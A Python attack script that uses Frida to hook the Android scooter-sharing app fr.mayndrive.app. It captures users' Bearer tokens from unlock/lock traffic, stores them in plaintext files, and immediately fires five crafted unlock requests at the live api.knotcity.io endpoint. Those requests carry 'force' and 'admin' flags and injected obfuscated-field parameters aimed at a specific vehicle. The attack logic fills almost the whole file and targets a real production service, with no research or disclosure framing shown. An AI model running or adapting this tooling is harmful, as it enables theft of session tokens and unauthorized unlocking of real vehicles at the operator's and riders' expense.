#!/usr/bin/env python3
"""
Capture Fresh Token for Code Analysis Vulnerabilities
Capture a fresh token and immediately test code analysis vulnerabilities
"""

import frida
import sys
import json
import time
import subprocess
import os
import re
import requests
from datetime import datetime

PACKAGE_NAME = "fr.mayndrive.app"
SCRIPT_FILE = "capture_WORKING_FINAL.js"
OUTPUT_FILE = "CAPTURED_FRESH_TOKEN_CODE_ANALYSIS.txt"
OUTPUT_JSON = "CAPTURED_FRESH_TOKEN_CODE_ANALYSIS.json"

# API Configuration
BASE_URL = "https://api.knotcity.io"

captured_data = []

def append_record(record):
    captured_data.append(record)
    with open(OUTPUT_JSON, 'w', encoding='utf-8') as jf:
        json.dump(captured_data, jf, indent=2, ensure_ascii=False)

def write_block(title, lines):
    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
        separator = '=' * 80
        f.write(f"\n{separator}\n")
        f.write(f"{title}\n")
        f.write(f"{separator}\n")
        for line in lines:
            f.write(f"{line}\n")
        f.write(f"{separator}\n")

def find_adb():
    """Find adb executable"""
    adb_path = os.environ.get('ADB_PATH')
    if adb_path and os.path.exists(adb_path):
        return adb_path
    
    if os.path.exists("platform-tools/adb.exe"):
        return "platform-tools/adb.exe"
    
    try:
        subprocess.run(["adb", "version"], capture_output=True, check=True)
        return "adb"
    except:
        pass
    
    for root, dirs, files in os.walk("."):
        if "adb.exe" in files:
            return os.path.join(root, "adb.exe")
    
    return None

def restart_frida_server():
    print("[!] Restarting frida-server on device...")
    
    adb_path = find_adb()
    if not adb_path:
        print("[-] adb not found. Please restart frida-server manually.")
        return False
    
    commands = [
        [adb_path, "shell", "su", "-c", "pkill frida-server"],
        [adb_path, "shell", "su", "-c", "/data/local/tmp/frida-server >/dev/null 2>&1 &"]
    ]
    for cmd in commands:
        try:
            subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        except FileNotFoundError:
            print("[-] adb not found. Please restart frida-server manually.")
            return False
    time.sleep(2)
    print("[+] frida-server restart issued")
    return True

def test_code_analysis_vulnerabilities_with_token(token):
    """Test code analysis vulnerabilities with fresh token"""
    print("\n" + "=" * 80)
    print("[CODE ANALYSIS TEST] Testing vulnerabilities with fresh token")
    print("=" * 80)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test 1: Admin/Force Unlock Coroutine (B4.W4)
    print("\n[TEST 1] Admin/Force Unlock Coroutine (B4.W4)")
    admin_payload = {
        "serial_number": "SXB306",
        "lat": 48.8566,
        "lng": 2.3522,
        "force": True,
        "admin": True,
        "coroutine_type": "B4.W4"
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock",
            headers=headers,
            json=admin_payload,
            timeout=15
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print(f"   [SUCCESS] Admin/Force unlock coroutine exploit successful!")
            return True
        elif response.status_code == 401:
            print(f"   [ERROR] Token still invalid")
            return False
        elif response.status_code == 403:
            print(f"   [BLOCKED] Permission denied")
        else:
            print(f"   [INFO] Status: {response.status_code}")
            
    except Exception as e:
        print(f"   [ERROR] Request failed: {e}")
    
    # Test 2: Obfuscated Field Injection
    print("\n[TEST 2] Obfuscated Field Injection")
    obfuscated_payload = {
        "serial_number": "SXB306",
        "lat": 48.8566,
        "lng": 2.3522,
        "f2925Z": token,  # Token field
        "f2927g0": "SXB306",  # Serial field
        "f2928h0": {"lat": 48.8566, "lng": 2.3522},  # Location field
        "f2882i0": True  # Force field
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock",
            headers=headers,
            json=obfuscated_payload,
            timeout=15
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print(f"   [SUCCESS] Obfuscated field injection successful!")
            return True
        elif response.status_code == 401:
            print(f"   [ERROR] Token still invalid")
            return False
        elif response.status_code == 403:
            print(f"   [BLOCKED] Permission denied")
        else:
            print(f"   [INFO] Status: {response.status_code}")
            
    except Exception as e:
        print(f"   [ERROR] Request failed: {e}")
    
    # Test 3: Interface Method Manipulation
    print("\n[TEST 3] Interface Method Manipulation (T3.I.n)")
    interface_payload = {
        "serial": "SXB306",
        "latitude": 48.856614,
        "longitude": 2.352222,
        "method": "n",  # T3.I interface method
        "force": True
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock",
            headers=headers,
            json=interface_payload,
            timeout=15
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print(f"   [SUCCESS] Interface method manipulation successful!")
            return True
        elif response.status_code == 401:
            print(f"   [ERROR] Token still invalid")
            return False
        elif response.status_code == 403:
            print(f"   [BLOCKED] Permission denied")
        else:
            print(f"   [INFO] Status: {response.status_code}")
            
    except Exception as e:
        print(f"   [ERROR] Request failed: {e}")
    
    # Test 4: Repository Method Exploitation
    print("\n[TEST 4] Repository Method Exploitation (C4887q.a)")
    repository_payload = {
        "serial_number": "SXB306",
        "lat": 48.8566,
        "lng": 2.3522,
        "repository_method": "a",  # C4887q repository method
        "action": "activate",
        "force": True
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock",
            headers=headers,
            json=repository_payload,
            timeout=15
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print(f"   [SUCCESS] Repository method exploitation successful!")
            return True
        elif response.status_code == 401:
            print(f"   [ERROR] Token still invalid")
            return False
        elif response.status_code == 403:
            print(f"   [BLOCKED] Permission denied")
        else:
            print(f"   [INFO] Status: {response.status_code}")
            
    except Exception as e:
        print(f"   [ERROR] Request failed: {e}")
    
    # Test 5: Token Storage Exploitation
    print("\n[TEST 5] Token Storage Exploitation (P3.D.b)")
    token_storage_payload = {
        "serial_number": "SXB306",
        "lat": 48.8566,
        "lng": 2.3522,
        "token_storage_method": "b",  # P3.D token storage method
        "token_format": "Bearer",
        "force_refresh": True
    }
    
    try:
        response = requests.post(
            f"{BASE_URL}/api/application/vehicles/unlock",
            headers=headers,
            json=token_storage_payload,
            timeout=15
        )
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print(f"   [SUCCESS] Token storage exploitation successful!")
            return True
        elif response.status_code == 401:
            print(f"   [ERROR] Token still invalid")
            return False
        elif response.status_code == 403:
            print(f"   [BLOCKED] Permission denied")
        else:
            print(f"   [INFO] Status: {response.status_code}")
            
    except Exception as e:
        print(f"   [ERROR] Request failed: {e}")
    
    return False

def on_message(message, data):
    if message['type'] == 'send':
        payload = message['payload']
        timestamp = datetime.now().isoformat()
        
        print(f"[{timestamp}] {payload}")
        
        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] {payload}\n")
        
        if isinstance(payload, dict):
            if payload.get('type') in ['unlock_request', 'lock_request']:
                auth = payload.get('authorization', 'N/A')
                bearer_pattern = r'Bearer eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
                token_match = re.search(bearer_pattern, auth)
                
                if token_match:
                    token = token_match.group(0)
                    
                    # Save token immediately
                    with open('FRESH_TOKEN_FOR_CODE_ANALYSIS.txt', 'w', encoding='utf-8') as f:
                        f.write(token)
                    
                    print(f"[SAVED] Fresh token saved to FRESH_TOKEN_FOR_CODE_ANALYSIS.txt")
                    print(f"[TOKEN] {token[:50]}...")
                    
                    # Immediately test code analysis vulnerabilities with fresh token
                    print(f"\n[IMMEDIATE TEST] Testing code analysis vulnerabilities with fresh token...")
                    success = test_code_analysis_vulnerabilities_with_token(token)
                    
                    # Save results
                    results = {
                        "timestamp": timestamp,
                        "token": token,
                        "code_analysis_success": success,
                        "payload": payload
                    }
                    
                    with open('CODE_ANALYSIS_TEST_RESULTS.json', 'w', encoding='utf-8') as f:
                        json.dump(results, f, indent=2, ensure_ascii=False)
                    
                    print(f"\n[RESULTS] Code analysis test results saved to CODE_ANALYSIS_TEST_RESULTS.json")
                    
                    if success:
                        print(f"[CRITICAL] CODE ANALYSIS VULNERABILITIES CONFIRMED!")
                        print(f"[WARNING] Fresh token bypassed code-level security controls!")
                    else:
                        print(f"[OK] Code analysis vulnerabilities blocked even with fresh token")
                    
                else:
                    print(f"[WARNING] Could not extract Bearer token from payload")

def main():
    print("=" * 80)
    print("[+] FRESH TOKEN CAPTURE FOR CODE ANALYSIS")
    print("=" * 80)
    print("[!] This script will capture a fresh token and immediately test code analysis vulnerabilities.")
    print("[!] Testing: Coroutine classes, Obfuscated fields, Interface methods, Repository classes")
    print("=" * 80)
    
    if not restart_frida_server():
        print("[ERROR] Failed to restart Frida server")
        return
    
    try:
        device = frida.get_usb_device()
        print(f"[+] Device: {device.name}")
        
        with open(SCRIPT_FILE, 'r', encoding='utf-8') as f:
            script_code = f.read()
        
        # Clear output files
        open(OUTPUT_FILE, 'w').close()
        open(OUTPUT_JSON, 'w').close()
        
        print(f"[*] Spawning {PACKAGE_NAME}...")
        try:
            pid = device.spawn([PACKAGE_NAME])
        except frida.ProcessNotFoundError:
            print(f"[ERROR] App {PACKAGE_NAME} not found. Make sure it's installed.")
            return
        except frida.ProcessNotRespondingError:
            print(f"[ERROR] App {PACKAGE_NAME} not responding. Trying to restart frida-server...")
            if restart_frida_server():
                try:
                    pid = device.spawn([PACKAGE_NAME])
                except Exception as e:
                    print(f"[ERROR] Still failed to spawn app: {e}")
                    return
            else:
                return
        except Exception as e:
            print(f"[ERROR] Failed to spawn app: {e}")
            return
        
        session = device.attach(pid)
        
        # Create script
        script = session.create_script(script_code)
        script.on('message', on_message)
        script.load()
        
        # Resume app
        device.resume(pid)
        print(f"[+] App launched! PID: {pid}")
        
        print("\n" + "=" * 80)
        print("🎯 INSTRUCTIONS FOR CODE ANALYSIS TEST")
        print("=" * 80)
        print("1. Log in with your FIRST account in the spawned app")
        print("2. Perform an UNLOCK/LOCK operation on a scooter")
        print("3. Watch for immediate code analysis vulnerability testing")
        print("4. Check results in CODE_ANALYSIS_TEST_RESULTS.json")
        print("5. Press Ctrl+C here when you are done")
        print("=" * 80)
        
        sys.stdin.read()
        
    except frida.ServerNotRunningError:
        print("[ERROR] Frida server is not running. Please start it on your device.")
    except frida.TimedOutError:
        print("[ERROR] Timed out waiting for USB device. Is your device connected and authorized?")
    except frida.NotSupportedError:
        print("[ERROR] Device not supported or Frida setup incorrect.")
    except Exception as e:
        print(f"[ERROR] An unexpected error occurred: {e}")
    finally:
        print("\n[OK] Fresh token capture for code analysis session ended.")
        if 'session' in locals() and session:
            session.detach()
        print("=" * 80)

if __name__ == "__main__":
    main()
